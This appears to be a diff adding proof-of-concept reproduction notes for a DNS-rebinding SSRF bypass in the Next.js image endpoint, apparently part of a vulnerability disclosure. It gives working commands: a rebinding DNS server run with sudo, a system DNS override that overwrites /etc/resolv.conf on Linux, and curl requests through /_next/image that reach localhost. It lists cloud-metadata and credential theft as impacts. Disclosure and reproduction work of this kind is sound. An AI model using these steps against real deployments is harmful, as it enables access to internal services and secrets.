@@ -1,0 +1,91 @@
+================================================================================
+DNS REBINDING SSRF - COMPLETE REPRODUCTION INSTRUCTIONS
+================================================================================
+
+FASTEST 5-MINUTE REPRODUCTION:
+------------------------------
+
+1. CREATE TEST APP:
+   npx create-next-app@latest test-app --typescript --app
+   cd test-app
+
+2. CONFIGURE (next.config.js):
+   module.exports = {
+     images: {
+       remotePatterns: [{ protocol: 'http', hostname: '**' }],
+       dangerouslyAllowLocalIP: false, // VULNERABLE (default)
+     }
+   }
+
+3. START NEXT.JS:
+   npm run dev
+   # Runs on http://localhost:3000
+
+4. START DNS SERVER (new terminal):
+   pip3 install dnslib
+   sudo python3 poc-dns-rebinding/dns-rebinding-server.py 8.8.8.8 127.0.0.1
+
+5. CONFIGURE SYSTEM DNS:
+   # macOS:
+   sudo mkdir -p /etc/resolver
+   echo "nameserver 127.0.0.1" | sudo tee /etc/resolver/ssrf.test
+   
+   # Linux:
+   sudo bash -c 'echo "nameserver 127.0.0.1" > /etc/resolv.conf'
+
+6. TEST IT:
+   # First verify protection works:
+   curl "http://localhost:3000/_next/image?url=http://127.0.0.1:3000/&w=640&q=75"
+   # Expected: 400 - "url" parameter is not allowed ✅
+   
+   # Now bypass with DNS rebinding:
+   curl "http://localhost:3000/_next/image?url=http://ssrf.test:3000/&w=640&q=75" -v
+   # Expected: 200 - Success! ⚠️
+
+7. OBSERVE DNS SERVER LOGS:
+   You should see:
+   [VALIDATION] Request #1 → Returning PUBLIC IP: 8.8.8.8
+   [EXPLOITATION] Request #2 → Returning PRIVATE IP: 127.0.0.1 ⚠️
+
+VULNERABILITY CONFIRMED! ✅
+
+================================================================================
+
+DETAILED GUIDES AVAILABLE:
+--------------------------
+- QUICKSTART.md                           → 5-minute quick start
+- POC_DNS_REBINDING_REPRODUCTION_GUIDE.md → Complete 10-part guide
+- SSRF_DNS_REBINDING_VULNERABILITY.md     → Full vulnerability report
+- VULNERABILITY_SUMMARY.md                → Executive summary
+
+WORKING CODE:
+-------------
+- poc-dns-rebinding/dns-rebinding-server.py → DNS rebinding server
+
+SUCCESS INDICATORS:
+-------------------
+✅ DNS server shows TWO different IPs returned
+✅ First IP is PUBLIC (8.8.8.8) - passes SSRF check
+✅ Second IP is PRIVATE (127.0.0.1) - bypasses check
+✅ curl returns HTTP 200 (not 400)
+✅ Request accesses localhost despite protection
+
+TROUBLESHOOTING:
+----------------
+❌ "Permission denied" → Run DNS server with sudo
+❌ "DNS not resolving" → Check /etc/resolv.conf or /etc/resolver/
+❌ "Same IP twice" → Clear DNS cache: sudo killall -HUP mDNSResponder
+❌ "400 error" → Check remotePatterns in next.config.js
+
+REAL-WORLD IMPACT:
+------------------
+This vulnerability allows:
+→ AWS metadata access (169.254.169.254)
+→ Internal network scanning
+→ Kubernetes API access
+→ Docker API access
+→ Credential/secret theft
+
+SEVERITY: HIGH (CVSS 8.6)
+
+================================================================================
